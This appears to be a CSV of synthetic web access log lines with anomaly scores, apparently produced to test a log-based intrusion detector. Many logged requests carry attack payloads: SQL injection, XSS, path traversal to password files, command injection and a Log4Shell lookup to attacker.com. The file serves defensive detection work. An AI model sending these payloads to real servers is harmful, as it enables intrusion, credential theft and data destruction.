score_content,score_session,score_fused,score_fused_norm,line
2.046407461166382,,2.046407461166382,2.046407461166382,215.182.178.232 - - [10/Jan/2025:12:04:09 +0100] "GET /logout HTTP/1.1" 200 5846 "https://www.google.com/" "sqlmap/1.5.10#stable"
11029.9150390625,,11029.9150390625,11029.9150390625,33.113.67.95 - - [10/Jan/2025:12:04:10 +0100] "GET /wp-login.php HTTP/1.1" 503 1176 "https://www.google.com/" "curl/7.68.0"
11031.408203125,,11031.408203125,11031.408203125,96.115.139.250 - - [10/Jan/2025:12:04:14 +0100] "GET /dashboard HTTP/1.1" 500 302 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.1167080402374268,,2.1167080402374268,2.1167080402374268,197.38.243.118 - - [10/Jan/2025:12:04:16 +0100] "GET /admin HTTP/1.1" 200 16464 "https://www.google.com/" "sqlmap/1.5.10#stable"
1.948891043663025,,1.948891043663025,1.948891043663025,122.230.75.249 - - [10/Jan/2025:12:04:16 +0100] "GET /dashboard HTTP/1.1" 204 9784 "https://www.google.com/" "python-requests/2.31.0"
24.329090118408203,,24.329090118408203,24.329090118408203,188.123.231.11 - - [10/Jan/2025:12:04:20 +0100] "GET /search?q=camera HTTP/1.1" 200 3780 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.5253815650939941,,0.5253815650939941,0.5253815650939941,115.92.24.84 - - [10/Jan/2025:12:04:20 +0100] "GET /.env HTTP/1.1" 201 7320 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
27.132659912109375,,27.132659912109375,27.132659912109375,51.6.22.138 - - [10/Jan/2025:12:04:25 +0100] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 304 9207 "-" "nikto/2.5.0"
24.603538513183594,,24.603538513183594,24.603538513183594,131.242.15.233 - - [10/Jan/2025:12:04:29 +0100] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 200 19927 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
24.37885284423828,,24.37885284423828,24.37885284423828,4.73.89.90 - - [10/Jan/2025:12:04:30 +0100] "GET /search?q=phone HTTP/1.1" 200 12316 "https://news.ycombinator.com/" "curl/7.68.0"
3.0588035583496094,,3.0588035583496094,3.0588035583496094,206.114.74.42 - - [10/Jan/2025:12:04:34 +0100] "GET /cgi-bin/test.cgi HTTP/1.1" 302 13718 "https://news.ycombinator.com/" "dirb/2.22"
2.0981171131134033,,2.0981171131134033,2.0981171131134033,122.254.223.135 - - [10/Jan/2025:12:04:35 +0100] "GET /about HTTP/1.1" 200 10036 "-" "curl/7.68.0"
2.094970941543579,,2.094970941543579,2.094970941543579,107.45.143.119 - - [10/Jan/2025:12:04:39 +0100] "GET /about HTTP/1.1" 200 9056 "https://twitter.com/" "sqlmap/1.5.10#stable"
0.5541379451751709,,0.5541379451751709,0.5541379451751709,11.211.212.78 - - [10/Jan/2025:12:04:40 +0100] "GET /.env HTTP/1.1" 200 16175 "https://news.ycombinator.com/" "python-requests/2.31.0"
24.459209442138672,,24.459209442138672,24.459209442138672,40.68.77.245 - - [10/Jan/2025:12:04:44 +0100] "GET /api/product?id=123 HTTP/1.1" 200 180 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
24.417755126953125,,24.417755126953125,24.417755126953125,233.177.166.63 - - [10/Jan/2025:12:04:44 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 200 16218 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.9313267469406128,,1.9313267469406128,1.9313267469406128,149.124.145.112 - - [10/Jan/2025:12:04:46 +0100] "GET /phpmyadmin HTTP/1.1" 200 11954 "https://news.ycombinator.com/" "python-requests/2.31.0"
2.048895835876465,,2.048895835876465,2.048895835876465,5.217.67.42 - - [10/Jan/2025:12:04:51 +0100] "GET /profile HTTP/1.1" 200 18950 "-" "python-requests/2.31.0"
0.1517409235239029,,0.1517409235239029,0.1517409235239029,70.93.108.163 - - [10/Jan/2025:12:04:52 +0100] "GET /../../etc/passwd HTTP/1.1" 200 1833 "-" "sqlmap/1.5.10#stable"
1.9124592542648315,,1.9124592542648315,1.9124592542648315,196.25.154.193 - - [10/Jan/2025:12:04:54 +0100] "GET /phpmyadmin HTTP/1.1" 200 6104 "https://twitter.com/" "curl/7.68.0"
2.0662038326263428,,2.0662038326263428,2.0662038326263428,25.137.149.91 - - [10/Jan/2025:12:04:56 +0100] "GET /logout HTTP/1.1" 200 11979 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
27.248746871948242,,27.248746871948242,27.248746871948242,88.236.234.42 - - [10/Jan/2025:12:04:57 +0100] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 304 13600 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
27.146116256713867,,27.146116256713867,27.146116256713867,158.177.213.244 - - [10/Jan/2025:12:04:58 +0100] "GET /login?user=admin&pass=admin HTTP/1.1" 304 18406 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30141.693359375,,30141.693359375,30141.693359375,123.90.80.177 - - [10/Jan/2025:12:05:01 +0100] "GET /contact HTTP/1.1" 400 35 "https://www.google.com/" "curl/7.68.0"
1.9567338228225708,,1.9567338228225708,1.9567338228225708,8.191.209.31 - - [10/Jan/2025:12:05:04 +0100] "GET /dashboard HTTP/1.1" 200 10083 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.209897994995117,,24.209897994995117,24.209897994995117,34.252.21.109 - - [10/Jan/2025:12:05:09 +0100] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 6976 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.35150718688965,,24.35150718688965,24.35150718688965,9.204.169.132 - - [10/Jan/2025:12:05:09 +0100] "GET /search?q=phone HTTP/1.1" 200 3632 "-" "python-requests/2.31.0"
24.541648864746094,,24.541648864746094,24.541648864746094,171.3.194.25 - - [10/Jan/2025:12:05:12 +0100] "GET /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 9984 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.212074279785156,,24.212074279785156,24.212074279785156,8.24.38.217 - - [10/Jan/2025:12:05:13 +0100] "GET /login?user=admin&pass=admin HTTP/1.1" 200 11619 "https://twitter.com/" "python-requests/2.31.0"
24.198213577270508,,24.198213577270508,24.198213577270508,26.210.149.196 - - [10/Jan/2025:12:05:15 +0100] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 2339 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
2.0819966793060303,,2.0819966793060303,2.0819966793060303,2.250.186.26 - - [10/Jan/2025:12:05:16 +0100] "GET /logout HTTP/1.1" 200 17700 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.06075151264667511,,0.06075151264667511,0.06075151264667511,47.214.91.252 - - [10/Jan/2025:12:05:21 +0100] "GET /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 3616 "https://news.ycombinator.com/" "dirb/2.22"
1.8431156873703003,,1.8431156873703003,1.8431156873703003,32.120.29.134 - - [10/Jan/2025:12:05:22 +0100] "GET /server-status HTTP/1.1" 200 10398 "https://news.ycombinator.com/" "curl/7.68.0"
0.3421095013618469,,0.3421095013618469,0.3421095013618469,30.99.73.117 - - [10/Jan/2025:12:05:24 +0100] "GET /index.html HTTP/1.1" 200 16277 "https://example.com/" "python-requests/2.31.0"
24.359386444091797,,24.359386444091797,24.359386444091797,75.253.219.110 - - [10/Jan/2025:12:05:29 +0100] "GET /search?q=camera HTTP/1.1" 200 13445 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.0419063568115234,,2.0419063568115234,2.0419063568115234,173.27.102.113 - - [10/Jan/2025:12:05:32 +0100] "GET /profile HTTP/1.1" 200 16210 "-" "python-requests/2.31.0"
3.3713300228118896,,3.3713300228118896,3.3713300228118896,190.237.229.251 - - [10/Jan/2025:12:05:32 +0100] "GET /.env HTTP/1.1" 301 3433 "-" "curl/7.68.0"
1.966598629951477,,1.966598629951477,1.966598629951477,32.60.215.109 - - [10/Jan/2025:12:05:34 +0100] "GET /dashboard HTTP/1.1" 200 13347 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
4.983188629150391,,4.983188629150391,4.983188629150391,92.122.171.155 - - [10/Jan/2025:12:05:36 +0100] "GET /login HTTP/1.1" 302 13214 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
0.16670885682106018,,0.16670885682106018,0.16670885682106018,126.128.60.161 - - [10/Jan/2025:12:05:40 +0100] "GET /cgi-bin/test.cgi HTTP/1.1" 200 8314 "-" "curl/7.68.0"
2.0869882106781006,,2.0869882106781006,2.0869882106781006,249.46.98.155 - - [10/Jan/2025:12:05:40 +0100] "GET /about HTTP/1.1" 200 976 "https://example.com/" "sqlmap/1.5.10#stable"
3.1903038024902344,,3.1903038024902344,3.1903038024902344,197.127.203.120 - - [10/Jan/2025:12:05:41 +0100] "GET /.git/config HTTP/1.1" 302 17137 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
24.563884735107422,,24.563884735107422,24.563884735107422,140.5.244.196 - - [10/Jan/2025:12:05:46 +0100] "GET /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 17812 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30163.91796875,,30163.91796875,30163.91796875,118.10.9.46 - - [10/Jan/2025:12:05:46 +0100] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 401 906 "https://www.google.com/" "python-requests/2.31.0"
27.292808532714844,,27.292808532714844,27.292808532714844,196.29.146.173 - - [10/Jan/2025:12:05:49 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 302 16072 "https://twitter.com/" "nikto/2.5.0"
24.5604248046875,,24.5604248046875,24.5604248046875,130.15.101.68 - - [10/Jan/2025:12:05:54 +0100] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 200 5221 "https://twitter.com/" "nikto/2.5.0"
27.23603630065918,,27.23603630065918,27.23603630065918,83.16.8.152 - - [10/Jan/2025:12:05:57 +0100] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 304 9420 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
4.97744083404541,,4.97744083404541,4.97744083404541,98.25.110.89 - - [10/Jan/2025:12:05:59 +0100] "GET /admin HTTP/1.1" 302 11282 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
24.220848083496094,,24.220848083496094,24.220848083496094,152.22.234.177 - - [10/Jan/2025:12:06:01 +0100] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 10326 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.0812830924987793,,2.0812830924987793,2.0812830924987793,118.169.222.109 - - [10/Jan/2025:12:06:01 +0100] "GET /admin HTTP/1.1" 200 1324 "https://example.com/" "dirb/2.22"
11031.6455078125,,11031.6455078125,11031.6455078125,147.100.83.147 - - [10/Jan/2025:12:06:01 +0100] "GET /admin HTTP/1.1" 502 773 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.226045608520508,,24.226045608520508,24.226045608520508,208.196.171.87 - - [10/Jan/2025:12:06:01 +0100] "GET /login?user=admin&pass=admin HTTP/1.1" 200 16574 "https://twitter.com/" "curl/7.68.0"
1.8201714754104614,,1.8201714754104614,1.8201714754104614,216.218.138.55 - - [10/Jan/2025:12:06:03 +0100] "GET /server-status HTTP/1.1" 200 2568 "https://example.com/" "python-requests/2.31.0"
3.4303579330444336,,3.4303579330444336,3.4303579330444336,184.217.149.25 - - [10/Jan/2025:12:06:03 +0100] "GET /.env HTTP/1.1" 304 3113 "https://example.com/" "sqlmap/1.5.10#stable"
24.58074378967285,,24.58074378967285,24.58074378967285,204.20.167.211 - - [10/Jan/2025:12:06:03 +0100] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 200 11480 "https://twitter.com/" "python-requests/2.31.0"
24.408660888671875,,24.408660888671875,24.408660888671875,65.160.132.117 - - [10/Jan/2025:12:06:05 +0100] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 13282 "-" "curl/7.68.0"
0.23088379204273224,,0.23088379204273224,0.23088379204273224,170.247.211.191 - - [10/Jan/2025:12:06:10 +0100] "GET /assets/app.js HTTP/1.1" 200 7078 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
30141.4765625,,30141.4765625,30141.4765625,161.16.134.52 - - [10/Jan/2025:12:06:15 +0100] "GET /server-status HTTP/1.1" 404 1488 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
30163.880859375,,30163.880859375,30163.880859375,82.221.213.234 - - [10/Jan/2025:12:06:16 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 400 840 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.387968063354492,,24.387968063354492,24.387968063354492,176.154.61.104 - - [10/Jan/2025:12:06:19 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 204 8503 "-" "Wget/1.20.3 (linux-gnu)"
27.136072158813477,,27.136072158813477,27.136072158813477,119.125.144.254 - - [10/Jan/2025:12:06:20 +0100] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 304 10275 "https://news.ycombinator.com/" "dirb/2.22"
1.959177017211914,,1.959177017211914,1.959177017211914,8.67.203.206 - - [10/Jan/2025:12:06:25 +0100] "GET /api/products HTTP/1.1" 200 4570 "https://twitter.com/" "curl/7.68.0"
11029.7294921875,,11029.7294921875,11029.7294921875,201.6.15.221 - - [10/Jan/2025:12:06:26 +0100] "GET /wp-login.php HTTP/1.1" 500 995 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30141.529296875,,30141.529296875,30141.529296875,230.94.172.169 - - [10/Jan/2025:12:06:30 +0100] "GET /phpmyadmin HTTP/1.1" 403 833 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.418476104736328,,24.418476104736328,24.418476104736328,239.31.134.171 - - [10/Jan/2025:12:06:35 +0100] "GET /api/product?id=123 HTTP/1.1" 200 16492 "https://twitter.com/" "python-requests/2.31.0"
1.9062460660934448,,1.9062460660934448,1.9062460660934448,198.207.81.85 - - [10/Jan/2025:12:06:37 +0100] "GET /phpmyadmin HTTP/1.1" 200 4106 "https://www.google.com/" "dirb/2.22"
0.2915012538433075,,0.2915012538433075,0.2915012538433075,113.105.66.221 - - [10/Jan/2025:12:06:40 +0100] "GET /.git/config HTTP/1.1" 200 9096 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.3063538372516632,,0.3063538372516632,0.3063538372516632,122.175.64.247 - - [10/Jan/2025:12:06:44 +0100] "GET /.git/config HTTP/1.1" 200 13986 "https://www.google.com/" "python-requests/2.31.0"
30163.9765625,,30163.9765625,30163.9765625,166.248.232.156 - - [10/Jan/2025:12:06:46 +0100] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 400 43 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
24.407960891723633,,24.407960891723633,24.407960891723633,80.164.246.180 - - [10/Jan/2025:12:06:51 +0100] "GET /api/product?id=123 HTTP/1.1" 200 12705 "-" "curl/7.68.0"
24.3580322265625,,24.3580322265625,24.3580322265625,238.251.235.66 - - [10/Jan/2025:12:06:55 +0100] "GET /search?q=camera HTTP/1.1" 200 12977 "-" "curl/7.68.0"
30139.7265625,,30139.7265625,30139.7265625,82.226.208.197 - - [10/Jan/2025:12:06:56 +0100] "GET /..%2f..%2fetc%2fpasswd HTTP/1.1" 404 1293 "-" "dirb/2.22"
24.285688400268555,,24.285688400268555,24.285688400268555,238.216.86.184 - - [10/Jan/2025:12:06:58 +0100] "GET /search?q=headphones HTTP/1.1" 200 13631 "-" "Wget/1.20.3 (linux-gnu)"
1.9524558782577515,,1.9524558782577515,1.9524558782577515,187.209.141.189 - - [10/Jan/2025:12:06:59 +0100] "GET /phpmyadmin HTTP/1.1" 200 19830 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
0.25176504254341125,,0.25176504254341125,0.25176504254341125,162.114.203.165 - - [10/Jan/2025:12:07:04 +0100] "GET /wp-login.php HTTP/1.1" 201 6120 "-" "curl/7.68.0"
24.378110885620117,,24.378110885620117,24.378110885620117,29.41.64.133 - - [10/Jan/2025:12:07:07 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 200 2794 "https://twitter.com/" "curl/7.68.0"
24.380706787109375,,24.380706787109375,24.380706787109375,67.45.176.152 - - [10/Jan/2025:12:07:12 +0100] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 4474 "https://example.com/" "sqlmap/1.5.10#stable"
24.330059051513672,,24.330059051513672,24.330059051513672,242.214.227.147 - - [10/Jan/2025:12:07:13 +0100] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 12464 "-" "Wget/1.20.3 (linux-gnu)"
30164.0,,30164.0,30164.0,51.68.180.219 - - [10/Jan/2025:12:07:13 +0100] "GET /api/product?id=123 HTTP/1.1" 403 947 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.548337936401367,,24.548337936401367,24.548337936401367,44.243.146.31 - - [10/Jan/2025:12:07:16 +0100] "GET /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 12156 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30163.826171875,,30163.826171875,30163.826171875,31.58.183.53 - - [10/Jan/2025:12:07:19 +0100] "GET /search?q=camera HTTP/1.1" 400 1012 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.338701248168945,,24.338701248168945,24.338701248168945,154.56.211.73 - - [10/Jan/2025:12:07:21 +0100] "GET /search?q=laptop HTTP/1.1" 200 6870 "https://www.google.com/" "sqlmap/1.5.10#stable"
0.16790613532066345,,0.16790613532066345,0.16790613532066345,61.159.116.233 - - [10/Jan/2025:12:07:24 +0100] "GET /../../etc/passwd HTTP/1.1" 200 8678 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
0.18820910155773163,,0.18820910155773163,0.18820910155773163,35.224.83.250 - - [10/Jan/2025:12:07:28 +0100] "GET /cgi-bin/test.cgi HTTP/1.1" 200 15464 "https://www.google.com/" "dirb/2.22"
4.712438106536865,,4.712438106536865,4.712438106536865,19.25.143.16 - - [10/Jan/2025:12:07:33 +0100] "GET /server-status HTTP/1.1" 302 8496 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
11053.8466796875,,11053.8466796875,11053.8466796875,248.206.154.182 - - [10/Jan/2025:12:07:34 +0100] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 503 1373 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.545415461063385,,0.545415461063385,0.545415461063385,172.95.34.248 - - [10/Jan/2025:12:07:36 +0100] "GET /.env HTTP/1.1" 200 13033 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30164.220703125,,30164.220703125,30164.220703125,34.23.82.182 - - [10/Jan/2025:12:07:37 +0100] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 404 958 "https://www.google.com/" "dirb/2.22"
11029.728515625,,11029.728515625,11029.728515625,224.250.214.72 - - [10/Jan/2025:12:07:39 +0100] "GET /wp-login.php HTTP/1.1" 500 1022 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
